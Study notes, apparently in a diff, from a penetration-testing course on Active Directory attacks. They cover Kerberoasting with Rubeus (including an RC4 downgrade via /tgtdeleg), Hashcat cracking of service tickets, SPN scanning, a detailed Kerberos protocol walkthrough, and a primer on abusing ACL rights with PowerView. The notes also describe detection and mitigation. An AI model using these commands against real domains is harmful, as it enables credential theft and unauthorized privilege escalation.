+    		- Placing a limit on the number of tickets requested
+    		- Performing AES Kerberoasting
+
+* Viewing Rubeus's Capabilities
+	> We can first use Rubeus to gather some stats. From the output below, we can see that there are nine Kerberoastable users, seven of which support RC4 encryption for ticket requests and two of which support AES 128/256. More on encryption types later. We also see that all nine accounts had their password set this year (2022 at the time of writing). If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.
+	> Using the /stats Flag
+		PS C:\htb> .\Rubeus.exe kerberoast /stats
+	> Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.
+	> Using the /nowrap Flag
+		PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
+* A Note on Encryption Types
+	> The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.
+	> Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker(https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.
+	> Let's start by creating an SPN account named testspn and using Rubeus to Kerberoast this specific user to test this out. As we can see, we received the TGS ticket RC4 (type 23) encrypted.
+	> Using the /nowrap Flag
+		PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+	> Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here(https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.
+		PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+	> Next, let's crack this ticket using Hashcat and note how long it took. The account is set with a weak password found in the rockyou.txt wordlist for our purposes. Running this through Hashcat, we see that it took four seconds to crack on a CPU, and therefore it would crack almost instantly on a powerful GPU cracking rig and probably even on a single GPU.
+	> Cracking the Ticket with Hashcat & rockyou.txt
+		m1l0js@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
+
+	> Let's assume that our client has set SPN accounts to support AES 128/256 encryption. (Active Directory Users and Computers ==> Users ==> testspn Properties ==> Account options)
+	> If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.
+	> Checking Supported Encryption Types
+		PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+	> Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.
+	> Requesting a New Ticket
+		PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+	> To run this through Hashcat, we need to use hash mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96) per the handy Hashcat example_hashes table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing s to see the status of the cracking job.
+	> Running Hashcat & Checking the Status of the Cracking Job
+		m1l0js@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
+
+	> When the hash finally cracks, we see that it took 4 minutes 36 seconds for a relatively simple password on a CPU. This would be greatly magnified with a stronger/longer password.
+	> We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.
+	> Using the /tgtdeleg Flag
+		PS C:\htb>  .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
+
+	> In the above image, we can see that when supplying the /tgtdeleg flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256. This simple example shows the importance of detailed enumeration and digging deeper when performing attacks such as Kerberoasting. Here we could downgrade from AES to RC4 and cut cracking time down by over 4 minutes and 30 seconds. In a real-world engagement where we have a strong GPU password cracking rig at our disposal, this type of downgrade could result in a hash cracking in a few hours instead of a few days and could make and break our assessment.
+	> Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.
+	> It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.
+
+* Mitigation & Detection
+
+	> An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use Managed Service Accounts (MSA ==> https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and Group Managed Service Accounts (gMSA ==> https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.
+	> Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting Audit Kerberos Service Ticket Operations within Group Policy.
+		Policies => Windows Settings => Security settings => Advanced Audit Policy Configuration
+	> Doing so will generate two separate event IDs: 4769: A Kerberos service ticket was requested, and 4770: A Kerberos service ticket was renewed. 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.
+	> Below we can see an example of a Kerberoasting attack being logged. We see many event ID 4769 being logged in succession, which appears to be anomalous behavior. Clicking into one, we can see that a Kerberos service ticket was requested by the htb-student user (attacker) for the sqldev account (target). We can also see that the ticket encryption type is 0x17, which is the hex value for 23 (DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256), meaning that the requested ticket was RC4, so if the password was weak, there is a good chance that the attacker would be able to crack it and gain control of the sqldev account.
+		(https://academy.hackthebox.com/storage/modules/143/4769.png)
+
+	> Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).
+	> This excellent post(https://adsecurity.org/?p=3458) by Sean Metcalf highlights some mitigation and detection strategies for Kerberoasting.
+
+* Continuing Onwards
+	> Now that we have a set of (hopefully privileged) credentials, we can move on to see where we can use the credentials. We may be able to:
+
+    		- Access a host via RDP or WinRM as a local user or a local admin
+    		- Authenticate to a remote host as an admin using a tool such as PsExec
+    		- Gain access to a sensitive file share
+    		- Gain MSSQL access to a host as a DBA user, which can then be leveraged to escalate privileges
+
+	> Regardless of our access, we will also want to dig deeper into the domain for other flaws and misconfigurations that can help us expand our access and add to our report to provide more value to our clients.
+
+-=-=-=Aclaracion de unos conceptos anteriores
+[+] Kerberos overview & communication process
+	(https://adsecurity.org/wp-content/uploads/2015/04/Visio-KerberosComms.png)
+[+] Kerberos overview
+	> Active Directory implements Kerberos version 5 in two components: the Authentication service and the Ticket-granting service.
+	> The Authentication Service (AS) is the first contact the client has with Kerberos and is used to lookup the user’s password and create the Ticket Granting Ticket (TGT). The AS also creates the session key the user will use for future communication with Kerberos.
+	> The Ticket Granting Ticket (TGT) is the Kerberos ticket for the Ticket Granting Service (runs on the KDC) and is encrypted using the KDC key (KRBTGT domain Kerberos account), meaning that only a KDC can decrypt and read the ticket. While the user’s ticket ,the TGT, is set to expire after 10 hours (AD default), it can be renewed as often as needed during the TGT renewable lifetime which is 7 days (AD default). Once the authenticating user has a TGT, it presents the TGT to the KDC to get a Service Ticket for the Ticket Granting Service (TGS) on the KDC. Most key Kerberos communication occurs over UDP port 88, though starting with Windows Vista & Windows Server 2008 now default to using TCP for Kerberos ticket requests.
+	> There is a myth in the Windows Kerberos world that if a workstation’s clock is skewed more than 5 minutes from that of the Domain Controller, Kerberos authentication wouldn’t work.
+	> Technically, all clocks in the Kerberos world must be kept closely in-sync to prevent replay attacks. By default, Microsoft Active Directory has a tolerance of 5 minutes. Though in most cases, this doesn’t mater. When a client sends a Kerberos request to a DC, the DC will reply with a “KRB_ERROR – KRB_AP_ERR_SKEW (37)” and the Windows client will update its time for the Kerberos session with the DC and resend the request. Provided the clock skew between the client and DC is not more than the ticket lifetime (10 hours by default), the second request will be successful.
+		! Kerberized Internet Negotiation of Keys (KINK) RFC 4430 details how this works:
+    		! If the server clock and the client clock are off by more than the policy-determined clock skew limit (usually 5 minutes), the server MUST return a KRB_AP_ERR_SKEW.  The optional client’s time in the KRB-ERROR SHOULD be filled out.  If the server protects the error by adding the Cksum field and returning the correct client’s time, the client SHOULD compute the difference (in seconds) between the two clocks based upon the client and server time contained in the KRB-ERROR message.  The client SHOULD store this clock difference and use it to adjust its clock in subsequent messages.  If the error is not protected, the client MUST NOT use the difference to adjust subsequent messages, because doing so would allow an attacker to construct authenticators that can be used to mount replay attacks.
+
+* More simpler
+	> Every service that is Kerberos enabled has an entry point called a Service Principal Name (SPN) and each Kerberos user has a User Principal Name (UPN). For example, a user named Joe User in the ADSECURITY.ORG Kerberos realm aka AD domain (the Kerberos realm is always all Caps) has a UPN of JoeUser@ADSecurity.org. If Joe User initiates a connection to the share path \\server1.ADSecurity.org\Shared then Joe’s workstation will lookup the computer server1.ADSecurity.org in Active Directory and read its SPN attribute (cifs/server1.ADSecurity.org). The computer SPN is used to identify the application server in the Kerberos TGS ticket request. Furthermore, when Joe opens Outlook, his workstation performs similar actions looking up the Exchange server’s SPN
+
+*  Ticket Granting Ticket (aka logon ticket)
+1. Joe User logs on with his Active Directory user name and password to a domain-joined computer (usually a workstation). The computer takes the user’s password and runs a one way function (OWF) creating a hash of the password (typically the NTLM hash). Hashing the password is like taking a steak and running it through a meat grinder. The ground beef that is the result can never be reassembled back into the same steak we started with.
+This is used to  handle all Kerberos requests for the user (as well as other authentication methods such as NTLM).
+2. Kerberos authentication is initiated by sending a timestamp (PREAUTH data) encrypted with the user’s password-based encryption key (password NTLM hash).
+3. The user account (JoeUser@adsecurity.org) requests a Kerberos service ticket (TGT) with PREAUTH data (Kerberos Authentication Service Request or AS-REQ).
+4. The Domain Controller’s Kerberos service (KDC) receives the authentication request, validates the data, and replies with a TGT (Kerberos AS-REP). The TGT has a Privileged Attribute Certificate (PAC) which contains all the security groups in which the user is a member. The TGT is encrypted and signed by the KDC service account (KRBTGT) and only the domain KRBTGT account can read the data in the TGT.
+
+At this point, the user has a valid TGT which contains the users group membership and is used to prove the user is who they claim to be in further conversations with a Domain Controller (KDC). The TGT is sent to the Domain Controller every time a resource ticket is requested.
+
+* Ticket Granting Service ticket (aka resource access ticket)
+	5. When the user wants to access an AD resource (a file share for example), the user’s TGT from step 4 is presented to a Domain Controller (KDC) as proof of identity with a request for a resource ticket to a specific resource (Service Principal Name). The DC determines if the TGT is valid by checking the TGT’s signature and if valid, generates a resource access ticket (TGS) signed/encrypted with the KRBTGT account and a part encrypted with the Kerberos service account’s session key which the destination service uses to validate the TGS.
+	Note: The DC doesn’t validate the user has the appropriate access to the service, it only validates the TGT and builds a TGS based on the TGT information.
+	6. The resource service ticket (TGS) is sent to the user by the Domain Controller and is used for authentication to the resource. At this point, all communication has been between the user’s computer and the Domain Controller (KDC).
+	7. The user’s computer sends the user’s resource service ticket (TGS) to the service on the resource computer. If the destination service is a file share, the TGS is presented to the CIFS service for access.
+	8. The destination service (CIFS in this example) validates the TGS by ensuring it can decrypt the TGS component encrypted with the service’s session key. The service may send the TGS to a DC (KDC) to validate the PAC to ensure the user’s group membership presented is accurate. The service reviews the user’s group membership to determine what level of access, if any, the user has to the resource.
+
+
+* THE DETAILED PROCESS
+
+Here’s my example scenario to explain what occurs when a user logs on and opens Outlook to view his Exchange email. The bold text is the simple overview version while the detail follows.
+
+1.  	A user logs onto the domain ADSecurity.org on the workstation ADSecurityPC.
+2.	The user requests authentication by sending a timestamp encrypted with the users password encryption key.
+    		The workstation creates an encryption key derived from the user’s password (the user’s password is hashed using a one way function such as MD5 = (A) key) to encrypt a timestamp (date/time) as an authenticator (pre-authentication is required by AD in its default configuration, so the client must send an authenticator) . The authenticator is simply a method the client uses to prove to the KDC that the user is who he claims to be (since only the user & the KDC knows his password) and protects against replay attacks. This information is sent to the KDC in an AS-REQ (Authentication Service Request) packet. This request includes the client supported encryption algorithms.Keys used:
+    		(A)User’s password derived keyPacket Data:
+    		User account (user@ADSecurity.org) requests Kerberos service ticket (TGT) with PREAUTH dataKRB5: Kerberos AS-REQ
+    		1 Forwardable: FORWARDABLE tickets are allowed/requested
+    		1 Renewable: This ticket is RENEWABLE
+    		1 Canonicalize: This is a request for a CANONICALIZED ticket
+    		1 Renewable OK: We accept RENEWED ticketsClient Name (Principal): admin
+    		Realm: ADSECURITY.ORG
+    		Service: krbtgt/ADSecurity.org
+    		till: 2037-09-12 02:48:05 (UTC)
+    		rtime: 2037-09-12 02:48:05 (UTC)
+    		Nonce: 1976014234
+    		Principal Name: user
+    		HostAddress: METCORPORGDC02<20>
+    		PAC_Request: True
+    		Encryption Types: aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac rc4-hmac-exp rc4-hmac-old-exp des-cbc-md5KRB5: Kerberos AS-REP
+    		Client Name (Principal): user
+    		Tkt-vno: 5
+
+3.   	The Kerberos server (KDC) receives the authentication request, validates the data, and replies with a TGT.
+    		The KDC receives the AS-REQ, decrypts the authenticator (encrypted with key (A)), and validates the timestamp is within the time skew limits set by the domain (5 minutes by default). If the KDC is satisfied the request is a valid user request, the KDC responds with an AS-REP packet which includes the TGT. The TGT can only be decrypted by a KDC (using the (B) key) and is used to authenticate the user to the Kerberos server so it doesn’t have to look up the user’s password (long-term key) again. The KDC also includes a session key ((C)key) for use in future communication with the KC.Keys used:
+    		(B) Kerberos account’s password derived key
+    		(C)User’s Kerberos service (KDC) session key NOTE: The TGT is encrypted with the KRBTGT account password so only a valid Kerberos server can decrypt it. In an environment with RODCs, each RODC has its own krbtgt account with a unique password. This means that if a user presents a TGT received from a RODC to a writable DC, the DC dumps the TGT and generates a new one.Packet Data:
+    		The KDC replies with the TGT and session key
+    		KRB5: Kerberos AS-REP
+    		Client Name (Principal): User
+    		Ticket (Tkt-vno): 5
+    		Realm: ADSECURITY.ORG
+    		Server Name: krbtgt/ADSecurity.org
+    		enc-part aes256-cts-hmac-sha1-96
+    		[Encrypted Key]
+    		enc-part rc4-hmac
+    		[Encrypted Key]
+4.	The user opens Outlook which locates the user’s mailbox server and requests a TGS ticket for access.
+    		The workstation locates the Exchange mailbox server containing the user’s mailbox (MetcorpEXMB02.ADSecurity.org) and reads the ServicePrincipalName attribute on the computer account in AD (ExchangeMDB/ADSecurityEXMB02.ADSecurity.org – there are a bunch, so I will just use this one for the example).
+    		The client then sends a TGS-REQ to the KDC requesting a TGS for access to the Exchange service running on the MetcorpEXMB02 Exchange server. The TGS request includes the target server SPN, the user’s TGT (encrypted with the (B) key), and an authenticator (encrypted with the (C)key).Keys used:
+    		(B) Kerberos account’s password derived key
+    		(C)User’s Kerberos service (KDC) session keyPacket Data:
+    		User account requests service ticket (TGS) for MetcorpEXMB02 Exchange service access
+    		KRB5: Kerberos TGS-REQ
+    		1 Forwardable: FORWARDABLE tickets are allowed/requested
+    		1 Renewable: This ticket is RENEWABLE
+    		1 Canonicalize: This is a request for a CANONICALIZED ticket
+    		Realm: ADSECURITY.ORG
+    		Server Name: ExchangeMDB/MetcorpEXMB02.ADSecurity.org
+    		till: 2037-09-12 02:48:05 (UTC)
+    		Nonce: 1976014234
+    		Encryption Types: aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac rc4-hmac-exp rc4-hmac-old-exp des-cbc-md5KRB5: Kerberos AS-REP
+5.	The KDC validates the TGS request and replies with the TGS.
+    		The KDC replies with a TGS-REP packet to the client which includes 2 session tickets (TGS) (2?). One of the session tickets is encrypted with the user’s (KDC) session key ((C) key) and the second one is encrypted with the target server’s (KDC) session key ((D) key). The second TGS also includes the user’s group membership & associated SIDs which provides the server information used to determine authorization and help the server determine: Is the user allowed to access the server’s resource?
+    		Both session tickets include a new session key ((E)key) for exclusive use in communication between the Exchange server and the user.Keys used:
+    		(C) User’s Kerberos service (KDC) session key
+    		(D) Server’s Kerberos service (KDC) session key
+    		(E)User-Exchange service session keyPacket Data:
+    		The KDC replies with the service ticket (TGS) for MetcorpEXMB02 Exchange service access
+    		KRB5: Kerberos TGS-REP
+    		Client Name (Principal): User
+    		Ticket (Tkt-vno): 5
+    		Realm: ADSECURITY.ORG
+    		Server Name: krbtgt/ADSecurity.org
+    		enc-part aes256-cts-hmac-sha1-96
+    		[Encrypted Key]
+    		enc-part rc4-hmac
+    		[Encrypted Key]
+6.	The client authenticates to the Exchange server with the session ticket.
+    		The client sends the target server (MetcorpEXMB02.ADSecurity.org) an AP-REQ packet containing the TGS it received from the KDC encrypted with the server’s session key ((D) key) and an authenticator encrypted with the user-Exchange server session key ((E) key) . This lets the Exchange server know that the user was authenticated to the Kerberos domain (realm) and that the TGS is valid (assuming the Exchange server is able to decrypt it). The client also sends the server an authenticator (timestamp) encrypted with the session key ((E)key) it received from the KDC in Step 5. The Exchange server decrypts the TGS, extracts the user’s group information, extracts the session key, and uses the session key to decrypt the authenticator. This provides the server enough information to make an authorization decision. If the user is authorized to connect to the server, it sends a reply.Keys used:
+    		(C) User’s Kerberos service (KDC) session key
+    		(D) Server’s Kerberos service (KDC) session key
+    		(E) User-Exchange service session key
+7.	The Exchange server replies that authorization to the service is granted.
+    		The Exchange server sends the client an AP-REP packet which includes its own authenticator encrypted with the user-Exchange service session key ((E) key). This assumes the client requested mutual authentication which is the default configuration.Keys used:
+    		(E)User-Exchange service session key
+
+* Note: This is a simplified explanation of Kerberos and doesn’t cover everything involved in this process.
+
+* Kerberos Key Storage Locatons
+	> Workstation Keys:
+    		- User Key
+    		- Ticket-Granting Ticket
+    		- Ticket-Granting Service Session Key
+    		- Service Ticket
+    		- Session Key
+	> Domain Controller:
+
+    		- User Key
+    		- Ticket-Granting Service Key
+    		- Service Key
+
+	> Server:
+    		- Service Key
+    		- Session Key
+
+
+* DEFAULT AD KERBEROS POLICY SETTINGS
+    	- Enforce user logon restrictions: Enabled
+    	- Maximum lifetime for service ticket: 600 minutes (10 hours)
+    	- Maximum lifetime for user ticket: 600 minutes (10 hours)
+    	- Maximum lifetime for user ticket renewal : 7 days
+    - Maximum tolerance for computer clock synchronization: 5 minutes
+
+[+] Honeypot with Kerberos => (https://adsecurity.org/?p=3513)
+
+	PS C:\Windows\system32> $KerberoastEventData | where{$_.ServiceName -like "*Honeypot*"} | select EventID,Date,AccountName,ClientAddress,ServiceName
+
+
+
+-=-=-=
+
+[+] SPN Scanning - Service Discovery without Network Port Scanning
+	> The best way to discover services in an Active Directory environment is through what I call “SPN Scanning.”
+	> The primary benefit of SPN scanning for an attacker over network port scanning is that SPN scanning doesn’t require connections to every IP on the network to check service ports. SPN scanning performs service discovery via LDAP queries to a Domain Controller. Since SPN queries are part of normal Kerberos ticket behavior, it is difficult, if not infeasible to detect, while netowkr port scanning is pretty obvious.
+	> Service Principal Names (SPNs) are required for discovery of services that leverage Kerberos authentication.
+
+* SPN Format 
+	> An SPN is a string of the following format. For more information on the <alphanum> element, see [RFC2396] section 1.6.
+		SPN = serviceclass “/” hostname [“:”port] [“/” servicename]
+		serviceclass = alphanum
+		servicename = alphanum
+		Where:
+		serviceclass is a string that identifies the class of the service, such as “www” for a Web service or “ldap” for a directory service.
+		hostname ([RFC2396] section 3.2.2) is a string that is the name of the system. This SHOULD be the fully qualified domain name (FQDN).
+		port ([RFC2396] section 3.2.2) is a number that is the port number for the service.
+
+	> The servicename segment is a string that is the distinguished name (DN), objectGuid, Internet host name, or fully qualified domain name (FQDN) for the service.
+	> An application can supply a name of the form “RestrictedKrbHost/<hostname>” when its callers have provided the hostname but not the correct SPN for the service. Applications SHOULD NOT use “RestrictedKrbHost/<hostname>” due to the security considerations in section 5.1.2. Applications calling GSS-API directly MUST provide a target name which SHOULD be an SPN<28> for their service applications for Kerberos authentication.
+
+* Some of the more interesting services and example SPNs:
+	> SQL servers, instances, ports, etc.
+    	     MSSQLSvc/adsmsSQLAP01.adsecurity.org:1433
+    	> Exchange
+    	     exchangeMDB/adsmsEXCAS01.adsecurity.org
+    	> RDP
+    	     TERMSERV/adsmsEXCAS01.adsecurity.org
+    	> WSMan / WinRM / PS Remoting
+    	     WSMAN/adsmsEXCAS01.adsecurity.org
+    	> Hyper-V Host
+    	     Microsoft Virtual Console Service/adsmsHV01.adsecurity.org
+    	> VMWare VCenter
+    	     STS/adsmsVC01.adsecurity.org
+
+
+* Once the attacker has a list of Service Principal Names (SPNs) associated with service accounts, these SPNs can be used to request Kerberos TGS service tickets useful for offline TGS password cracking.
+	> If you have the Active Directory PowerShell module installed, you can easily find all SPNs of a specific type with Get-ADObject
+		get-adobject -filter {serviceprincipalname -like “*sql*”} -prop serviceprincipalname
+	> The AD PowerShell module quickly installs on Windows Server 2008R2 and newer:
+		import-module servermanager ; add-windowsfeature RSAT-AD-PowerShell
+
+* Note: This attack will not be successful when targeting services hosted by the Windows system since these services are mapped to the computer account in Active Directory which has an associated 128 character password which won’t be cracked anytime soon.
+
+	> This attack involves requesting a Kerberos service ticket(s) (TGS) for the Service Principal Name (SPN) of the target service account. This request uses a valid domain user’s authentication ticket (TGT) to request one or several service tickets for a target service running on a server. The Domain Controller doesn’t track if the user ever actually connects to these resources (or even if the user has access). The Domain Controller looks up the SPN in Active Directory and encrypts the ticket using the service account associated with the SPN in order for the service to validate user access. The encryption type of the requested Kerberos service ticket is RC4_HMAC_MD5 which means the service account’s NTLM password hash is used to encrypt the service ticket. This means that Kerberoast can attempt to open the Kerberos ticket by trying different NTLM hashes and when the ticket is successfully opened, the correct service account password is discovered.
+	> No elevated rights are required to get the service tickets and no traffic is sent to the target.
+
+
+
+-=-=-=
+[+] Access Control List (ACL) Abuse Primer
+	> For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.
+
+* Access Control List (ACL) Overview
+
+	> In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entities (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.
+
+	> There are two types of ACLs:
+
+    		- Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
+    		- System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.
+
+	> We see the ACL for the user account forend in the image below. Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.
+
+	> Viewing forend's ACL ==> (https://academy.hackthebox.com/storage/modules/143/DACL_example.png)
+		- The SACLs can be seen within the Auditing tab.
+
+	> Viewing the SACLs through the Auditing Tab ==> (https://academy.hackthebox.com/storage/modules/143/SACL_example.png)
+
+* Access Control Entities (ACEs)
+	> As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:
+		ACE 	Description
+		Access denied ACE 	Used within a DACL to show that a user or group is explicitly denied access to an object
+		Access allowed ACE 	Used within a DACL to show that a user or group is explicitly granted access to an object
+		System audit ACE 	Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred
+
+	> Each ACE is made up of the following four components:
+
+    		- The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
+    		- A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
+    		- A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
+    		- An access mask(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object
+
+		> We can view this graphically in Active Directory Users and Computers (ADUC). In the example image below, we can see the following for the ACE entry for the user forend:
+	> Viewing Permissions through Active Directory Users & Computers => (https://academy.hackthebox.com/storage/modules/143/ACE_example.png)
+
+
+    		- The security principal is Angela Dunn (adunn@inlanefreight.local)
+    		- The ACE type is Allow
+    		- Inheritance applies to the "This object and all descendant objects,” meaning any child objects of the forend object would have the same permissions granted
+    		- The rights granted to the object, again shown graphically in this example
+
+	> When access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.
+
+[+] Why are ACEs Important?
+
+	> Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:
+
+    		- ForceChangePassword abused with Set-DomainUserPassword
+    		- Add Members abused with Add-DomainGroupMember
+    		- GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
+    		- GenericWrite abused with Set-DomainObject
+    		- WriteOwner abused with Set-DomainObjectOwner
+    		- WriteDACL abused with Add-DomainObjectACL
+    		- AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
+    		- Addself abused with Add-DomainGroupMember
+
+	> In this module, we will cover enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:
+
+    		- ForceChangePassword - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
+    		- GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
+    		- AddSelf - shows security groups that a user can add themselves to.
+    		- GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.
+
+	> This graphic, adapted from a graphic created by Charlie Bromberg (Shutdown), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux => (https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)
+
+
+	> We will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the ReadGMSAPassword edge. In this case, there  are tools such as GMSAPasswordReader(https://github.com/rvazarkar/GMSAPasswordReader) that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as Unexpire-Password or Reanimate-Tombstones using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It's worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.
+
+* ACL Attacks in the Wild
+
+	> We can use ACL attacks for:
+
+    		- Lateral movement
+    		- Privilege escalation
+    		- Persistence
+
